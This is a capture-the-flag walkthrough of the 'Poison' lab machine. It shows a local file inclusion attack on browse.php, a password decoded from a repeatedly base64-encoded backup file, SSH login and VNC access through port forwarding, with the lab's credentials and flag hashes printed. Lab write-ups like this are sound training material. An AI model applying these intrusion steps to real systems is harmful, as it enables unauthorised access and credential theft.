# Poison
>Author : Xyan1d3
>Date : 5th July 2021
>IP : 10.10.10.84
>OS : FreeBSD
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Mon Jul  5 19:36:01 2021 as: nmap -sC -sV -v -oN nmap/poison 10.10.10.84
Nmap scan report for poison.htb (10.10.10.84)
Host is up (0.067s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

## Web Enumeration
We visit the website and find out that we have a website which executes local php files.
![[Pasted image 20210705195157.png]]

Here, We find that we have a field which takes the name of the local php file.
![[Pasted image 20210705200049.png]]
The file parameter on the `browse.php` is vulnerable to LFI.
On doing some `../` we could easily dump the `/etc/passwd`.
![[Pasted image 20210705200529.png]]

We could now, check all the php file listed on the homepage.

The `listfiles.php` is particularly instersting as it lists all the files inside the webdirectory.
![[Pasted image 20210705202833.png]]

We could visit the php page and list the files in the `www-data` directory.
![[Pasted image 20210705203029.png]]
```php
Array
(
    [0] => .
    [1] => ..
    [2] => browse.php
    [3] => index.php
    [4] => info.php
    [5] => ini.php
    [6] => listfiles.php
    [7] => phpinfo.php
    [8] => pwdbackup.txt
)
```

We could now visit the `pwdbackup.txt` and find out that it is a very long `base64` chunk encoded muliple times.
```txt
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
```

We use `cyberchef` and decode this chunk `13` times with `base64` decode to find our credentials.
![[Pasted image 20210705203514.png]]

# Initial FootHold as charix
The password after decoding it `13` times is `Charix!2#4%6&8(0`
```
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/poison]
└──╼ # ssh charix@10.10.10.84
The authenticity of host '10.10.10.84 (10.10.10.84)' can't be established.
ECDSA key fingerprint is SHA256:rhYtpHzkd9nBmOtN7+ft0JiVAu8qnywLb48Glz4jZ8c.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.84' (ECDSA) to the list of known hosts.
Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
charix@Poison:~ % id
uid=1001(charix) gid=1001(charix) groups=1001(charix)
charix@Poison:~ % whoami
charix
```

## Getting User Flag
```python
charix@Poison:~ % ls -l
total 8
-rw-r-----  1 root  charix  166 Mar 19  2018 secret.zip
-rw-r-----  1 root  charix   33 Mar 19  2018 user.txt
charix@Poison:~ % cat user.txt 
eaacdfb2d141b72a589233063604209c
```


# Root Escalation
We could check the open ports of the box by doing a `netstat -an`.
```python
charix@Poison:~ % netstat -an
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0      0 10.10.10.84.22         10.10.14.18.47570      ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
udp4       0      0 *.514                  *.*                    
udp6       0      0 *.514                  *.*
```
Here, We see that the box is listening on `VNC` which we could SSH port forward on to our box. 

We could check the home directory and find out that we have a `secret.zip`.
```python
charix@Poison:~ % ls -l
total 8
-rw-r-----  1 root  charix  166 Mar 19  2018 secret.zip
-rw-r-----  1 root  charix   33 Mar 19  2018 user.txt
```

We transfer this `zip` file onto our box and extract it using the SSH credentials of `charix` user. We find out we have a file which is junk.

We could use the `secret` file as a credential to `VNC` into the box.
After, SSH port tunneling `5801` and `5901` we could do a VNC to the box.
```python
vncviewer -passwd secret 127.0.0.1:5901
```
![[Pasted image 20210705212646.png]]

## Getting root Flag
```python
root@Poison:~ # ls -l
total 56
-rw-------  1 root  wheel     51 Jul  5 16:04 .Xauthority
-rw-r--r--  2 root  wheel    943 Mar 19  2018 .cshrc
-rw-------  1 root  wheel      0 Mar 19  2018 .history
-rw-r--r--  1 root  wheel    149 Jul 21  2017 .k5login
-rw-r--r--  1 root  wheel    295 Jul 21  2017 .login
-rw-r--r--  2 root  wheel    249 Jul 21  2017 .profile
-rw-------  1 root  wheel   1024 Jan 24  2018 .rnd
drwx------  2 root  wheel    512 Jan 24  2018 .ssh
drwxr-xr-x  2 root  wheel    512 Jan 24  2018 .vim
-rw-------  1 root  wheel  12952 Mar 19  2018 .viminfo
drwx------  2 root  wheel    512 Jul  5 16:04 .vnc
----------  1 root  wheel     33 Jan 24  2018 root.txt
root@Poison:~ # cat root.txt
716d04b188419cf2bb99d891272361f5
```